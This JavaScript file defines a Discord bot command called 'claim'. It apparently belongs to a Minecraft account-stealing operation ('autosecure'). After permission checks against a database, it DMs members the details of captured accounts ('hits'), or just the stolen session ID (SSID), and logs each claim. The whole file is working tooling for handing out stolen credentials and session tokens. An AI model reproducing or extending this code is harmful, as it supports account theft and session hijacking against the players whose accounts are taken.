const { ApplicationCommandOptionType } = require("discord.js");
const { queryParams } = require("../../../db/db");
const listAccount = require("../../utils/listAccount");
const { claimHitMessager } = require("../../utils/messager");
module.exports = {
  name: "claim",
  description: 'claim a hit',
  options: [
    {
      name: "ign",
      description: "The IGN of the account",
      type: ApplicationCommandOptionType.String,
      required: true
    }
  ],
  callback: async (client, interaction) => {

    // get the user settings
    let user = await queryParams(`SELECT * FROM users WHERE user_id=? AND child=?`, [client.username, interaction.user.id])
    // Not a Member OR his claiming setting is disabled AND he isn't the owner!
    if (interaction.user.id != client.username) {
      if (user.length == 0) {
        return interaction.reply({ content: `You're not a user of this bot!`, ephemeral: true })
      }
      user = user[0]
      if (user.claiming == -1) {
        return interaction.reply({ content: `You don't have access to claim hits!`, ephemeral: true })
      }
    }



    let settings = await queryParams(`SELECT * FROM autosecure WHERE user_id=?`, [client.username])
    if (settings.length == 0) {
      return interaction.reply({ content: `This server isn't setup properly!`, ephemeral: true })
    }
    settings = settings[0]
    let channelId, guildId = null
    if (settings.logs_channel) {
      [channelId, guildId] = settings.logs_channel.split("|")
    } else {
      return interaction.reply({ content: `Add a logs channel first!\nYour admins can do that using the command **/set**`, ephemeral: true })
    }

    let name = interaction.options.getString("ign")
    if (!client?.hits?.has(name)) return interaction.reply({ content: `Couldn't find your hit!`, ephemeral: true })

    let data = client.hits.get(name)
    if (user?.claiming == 1 || client.username == interaction.user.id) {
      let msg = await listAccount(data)
      try {
        await interaction.user.send(msg)
        await interaction.reply({ content: `Sent you the hit in dms!`, ephemeral: true })
        client.hits.delete(name)
        claimHitMessager(client, guildId, channelId, interaction, 1,name)
      } catch (e) {
        console.log(e)
        return interaction.reply({ content: `Unexpected error occured!\nPlease make sure that you have the dms enabled!`, ephemeral: true })
      }
    } else {
      try {
        if (data.ssid) {

          let msg = {
            embeds: [{
              title: `SSID`,
              description: `SSID \`${data.ssid}\``,
              color: 0x00ff00
            }],
            ephemeral: true
          }
          interaction.user.send(msg)
          interaction.reply({ content: `Sent you the hit in dms!`, ephemeral: true })
          client.hits.delete(name)
          claimHitMessager(client, guildId, channelId, interaction, 0,name)
        } else {
          return interaction.reply({ content: `This hit doesn't have minecraft!`, ephemeral: true })
        }
      } catch (e) {
        console.log(e)
        return interaction.reply({ content: `Unexpected error occured!\nPlease make sure that you have the dms enabled!`, ephemeral: true })
      }
    }

  }
}